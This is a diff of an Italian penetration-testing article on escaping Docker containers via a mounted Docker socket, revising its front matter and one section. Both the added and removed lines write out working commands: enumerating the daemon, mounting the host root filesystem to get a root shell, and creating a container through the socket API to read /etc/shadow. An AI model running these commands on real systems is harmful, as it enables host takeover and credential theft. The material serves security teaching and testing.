@@ -1,9 +1,7 @@
 ---
-title: 'Container Escape: tecniche reali per uscire dal container'
+title: 'Container Escape in Docker e Kubernetes: Privilege Escalation'
 slug: container-escape
-description: >-
-  Container escape: scopri tecniche reali di fuga da Docker e Kubernetes per
-  privilege escalation e breakout in ambienti reali.
+description: 'Guida pratica al container escape: Docker socket, container privilegiati, capabilities Linux, Kubernetes e tecniche reali di privilege escalation.'
 image: '/ChatGPT Image Feb 22, 2026, 03_40_21 PM.webp'
 draft: false
 date: 2026-02-26T00:00:00.000Z
@@ -188,36 +186,35 @@ root@host:/#
 
 ## 3. Escape via Docker Socket Montato
 
-Se il container ha accesso al socket Docker (`/var/run/docker.sock`), puoi controllare il Docker daemon dell'host — creare container, montare filesystem, eseguire comandi.
-
-### Verifica
+Prima di tentare l'escape, enumera cosa gira sul daemon Docker:
 
 ```bash
-ls -la /var/run/docker.sock
-# srw-rw---- 1 root docker 0 Jan 1 00:00 /var/run/docker.sock
+# Lista immagini disponibili
+docker -H unix:///var/run/docker.sock images
+
+# Lista tutti i container (anche fermati)
+docker -H unix:///var/run/docker.sock ps -a
+
+# Ispeziona un container specifico
+docker -H unix:///var/run/docker.sock inspect [CONTAINER_ID]
 ```
 
-Se esiste e hai permessi di lettura/scrittura, hai accesso completo al Docker daemon.
+Cosa cerchi: immagini con tag custom (rivelano stack interna), container fermati con volumi montati, variabili d'ambiente con credenziali hardcoded nell'inspect.
 
 ### Escape
 
 ```bash
-# Se docker CLI è disponibile nel container:
-docker -H unix:///var/run/docker.sock run -v /:/mnt --rm -it alpine chroot /mnt bash
+# Monta il filesystem host e ottieni shell
+docker -H unix:///var/run/docker.sock run -v /:/mnt --rm -it alpine chroot /mnt sh
+```
 
-# Se docker CLI non è disponibile, usa curl:
+> **Nota:** Usa sempre `sh` invece di `bash` — non tutte le immagini hanno bash installato. Se `chroot /mnt bash` dà "Permission denied" o "not found", `sh` funziona quasi sempre.
+
+Se docker CLI non è disponibile, usa curl:
+
+```bash
 # Lista container
 curl -s --unix-socket /var/run/docker.sock http://localhost/containers/json | python3 -m json.tool
-
-# Crea container con host mount
-curl -s --unix-socket /var/run/docker.sock -X POST \
-  -H "Content-Type: application/json" \
-  http://localhost/containers/create \
-  -d '{"Image":"alpine","Cmd":["/bin/sh","-c","cat /mnt/etc/shadow"],"Binds":["/:/mnt"],"HostConfig":{"Binds":["/:/mnt"]}}'
-
-# Avvia e leggi output
-curl -s --unix-socket /var/run/docker.sock -X POST http://localhost/containers/[ID]/start
-curl -s --unix-socket /var/run/docker.sock http://localhost/containers/[ID]/logs?stdout=true
 ```
 
 Per il dettaglio completo sull'exploitation del Docker API, vedi la [guida alla porta 2375 Docker](https://hackita.it/articoli/porta-2375-docker-api) — le tecniche sono identiche, cambia solo il trasporto (socket Unix vs TCP).
